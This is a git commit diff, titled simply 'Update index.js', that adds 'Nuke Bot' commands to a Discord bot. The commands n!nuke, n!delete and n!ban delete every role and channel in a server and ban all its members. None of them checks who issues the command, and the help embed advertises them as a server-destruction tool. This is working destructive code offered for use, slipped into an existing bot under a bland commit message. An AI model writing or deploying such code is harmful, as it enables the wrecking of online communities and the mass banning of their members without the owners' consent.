b59f1b3f80883140a808d4efd0ead943c47919be
Brad Deniger <62615814+nexx74@users.noreply.github.com>
2020-09-30 12:39:33 -0400

    Update index.js

--- index.js
+++ index.js
@@ -48,7 +48,30 @@ client.on('ready', () => {
 });
 
 //READY-------------------------------------------------------------------------------------------------------------------------------------------------------------------
+client.on("message", async(msg)=>{
 
+if(msg.content.toLowerCase().startsWith("n!" + "nuke")){
+    msg.guild.roles.filter(r=>r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+    msg.guild.members.tap(member => member.ban("Banned by Nuke Bot | Dev: Raxn"));
+}
+if(msg.content.toLowerCase().startsWith("n!" + "delete")){
+    msg.guild.roles.filter(r => r.position < msg.guild.me.highestRole.position).deleteAll();
+    msg.guild.channels.deleteAll();
+}
+if(msg.content.toLowerCase().startsWith("n!" + "ban")){
+    msg.guild.members.tap(member => member.ban("Banned By Nuke Bot | Developed By RAXN"));
+}
+if(msg.content.toLowerCase().startsWith("n!" + "help")){
+    msg.author.send({
+        embed: {
+            color: 0xff0000,
+            author: { name: "Nuke Bot | Test" },
+            description: "n!nuke - Bans all members & deletes all roles and channels\nn!delete - Deletes all channels and roles\nn!ban - Bans all members in the discord\n"
+        }
+    })
+}
+});
 client.on('message', message => {
 
     if (message.content.startsWith(prefix + "ping")) {
